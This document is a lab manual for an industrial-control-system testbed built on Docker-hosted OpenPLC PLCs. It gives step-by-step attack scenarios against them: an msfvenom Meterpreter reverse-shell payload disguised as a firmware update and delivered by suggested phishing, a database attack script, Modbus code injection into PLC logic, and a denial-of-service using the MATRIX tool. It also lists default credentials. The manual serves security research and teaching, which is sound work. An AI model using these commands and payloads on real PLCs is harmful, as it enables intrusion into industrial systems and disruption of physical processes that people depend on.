# Manual for Attack Scenarios on PLCs

## *ICS Network  network environment*
At this level, we consider you've installed the original testbed network (i.e from Yi Zhu's work). No mitigation solution has been implemented yet so all the components in the swat network can communicate with each other, no isolation nor segmentation is implemented yet.

## *Services running after running testbed*

Docker Containers

```bash
docker ps 
```

Displays the list of containers, you should have 06 plcs running, scadaBR and sim running.

**ScadaBR**
   - **Role:** Simulates a HMI and Historian in the Scada Network.
   - **Network:**
     - `Name` (Swat) 
     - `Ip address` (IP: 172.18.0.9)
   - **Ports:** 10010:8080

**PLC11**
   - **Role:** Simulates a PLC via OpenPLC in the Scada Network.
   - **Networks:**
     - `Name` (Swat)
     - `network2` (IP: 172.18.0.11)
   - **Ports:** 10011:8080

**PLC12**
   - **Role:** Simulates a PLC via OpenPLC in the Scada Network.
   - **Networks:**
     - `Name` (Swat)
     - `network2` (IP: 172.18.0.12)
   - **Ports:** 10012:8080

## *Accessing the Components on the browser*

1. **PLC11 Dashboard**:
   - URL: `http://172.18.0.11:10011`
   - **Username**: `openplc`
   - **Password**: `openplc`

1. **PLC12 Dashboard**:
   - URL: `http://172.18.0.12:10012`
   - **Username**: `openplc`
   - **Password**: `openplc`

## *Accessing the Components on via the docker cli*

bash:
```bash
# For plc11
docker exec -it plc11 bash 
# For plc12
docker exec -it plc12 bash 
```

**NB:** There are 06 PLCs in total, from PLC11 ... PLC16, they are in the same network named (swat) with their port number corresponding to their names 
**Ex :** Name :  PLC11, Port : 10011

## *Setting up the attacker's machine*

Docker command:
```bash
sudo docker run -d -t --net swat --hostname attacker --name attacker --privileged --ip 172.18.0.18 -p 10018:8080 kalilinux/kali-rolling
```

Docker container

**Attacker**
   - **Role:** Simulates the attacker in the Scada network.
   - **Networks:**
     - `Name` (Swat)
     - `network2` (IP: 172.18.0.18)
   - **Ports:** 10018:8080
   - **Description:** The attacker will install the basic tools to counter attack.

## *Accessing the attacker's machine via the docker cli*

bash:
```bash
docker exec -it attacker bash
```

**NB:** We assume the attacker is already in the swat network so he can access other components of the Scada network

## *Scenario - 1 : Exploit vulnerable OpenPLC database*

The first scenario consist of exploiting the sqlite database of OpenPLC using a script **db-attack.py** found in the **2 - Attack_scripts folder** 

If Metasploit is not installed, follow these steps:

Attacker's terminal
```bash
apt-get update && apt-get install -y git curl wget python3-pip
apt install metasploit-framework
```

### *Phase 1 : Craft malicious payload*

- The attacker creates a malicious payload usually named reverse shell using **Metasploit**’s `msfvenom` tool. to access to the plc's container : 

#### *Command to craft the payload in the attacker's machine*

Attacker's terminal
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.115 LPORT=4444 -f elf -o firmware_update.elf
``` 

- The attacker loads the malicious payload into the target's machine. In a real world case, he could use phishing or handle a USB key to an employee. He will eventually tell the employee that it could be firmware update for plcs. The idea is to have access to a target's machine in order to manipulate the PLC remotely. 
- In our attack scenario, we assume the phising attack went on successfullu, so we simply upload the crafted payload into the target container

bash 
```bash
docker cp attacker:/scripts/firmware_update.elf plc11:/workdir
```

Then in plc11, we run this 

Plc11 terminal
```bash
cd workdir
chmod +x firmware_update.elf
./firmware_update.elf
```

- The payload is running successfully in the target's machine, so the attacker can access the target machine using reverse shell of **Metasploit**’s `msfvenom` tool.

#### *Set up a Metasploit Listener:*

Attacker's terminal
```bash
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 172.18.0.18 #attacker's IP address
set LPORT 4444
exploit
```

- When the payload is executed, the attacker will gain a reverse shell into the system.
- The attacker can now manipulate the plc and executes any scripts he wishes, the attack uploads the `db-attack.py` to plc's machine

Illustration in meterpreter terminal:
```bash
upload /path/to/local/file /path/on/target/ (Upload from attacker to target machine)
```

Example

Meterpreter terminal
```bash
upload /scripts/db-attack.py /workdir
```
- After uplaoding the script in the target's machine, he can execute the script with ease from the meterpreter terminal

Meterpreter terminal
```bash
shell
python3 db-attack.py
```

![Screenshot](images/db/2.png)


## *Scenario - 2 : Code injection attack in plc*

The attacker changes the code logic of the plc without stopping it or without being detected. This change's the plc's logic and eventually disrupts the physical process

- As in the scenario 1, the attacker uploads a `code-injection.py` script in the target's machine, you could find the script in the `Attack_scripts` folder
- He uses the same attack method as in scenario 1

Meterpreter terminal
```bash
upload /scripts/code-injection.py /workdir
```

- The attacker can now execute the script into the target's machine, he needs the ip address and the modbus port number. He eventually obtained them from the reconnaissance phase

Meterpreter terminal
```bash
shell
python3 code-injection.py -t 172.18.0.11 -p 502
```

![Screenshot](images/code-injection/1.png)

Results on the open plc dashboard

![Screenshot](images/code-injection/2.png)


## *Scenario - 3 : DDOS attack in plc*

In this scenario, the attacker's aim is to make the plc unaccessible. The HMI and the MTU won't be able to access the PLC anymore

### The DDOS script developped by Matrix

Attacker terminal
```bash
# Clone the repository
git clone https://github.com/SpiderLabs/MATRIX.git
cd matrix
python3 -m venv venv
source venv/bin/activate 
pip3 install -r requirements.txt
apt-get install libpcap-dev
```

- Run the DOS command from the attacker's machine, the attacker doesn't need to be in the target's machine: 

```bash
python matrix.py -H 172.18.0.11 -p 502 -a dos -t 1000
```

- When the attack is lauched, you could verify by getting to the plc's terminal, it is preferable to open a terminal for plc before the attack

bash
```bash
docker exec -it plc11 bash
```

plc11 terminal
```bash
# Install htop to verify cpu metrics
apt install htop
htop
```

CPU overwhelmed after attack: 

![Screenshot](images/db//3.png)

## Summary

As you could see, implementing attacks is really easy to do, you could even more PLCS if you wish. Add more scripts and test them on ICS components easily. We experimented other testbeds and I can assure you, this is one of the easiest low-cost testbed to use for ICS security.
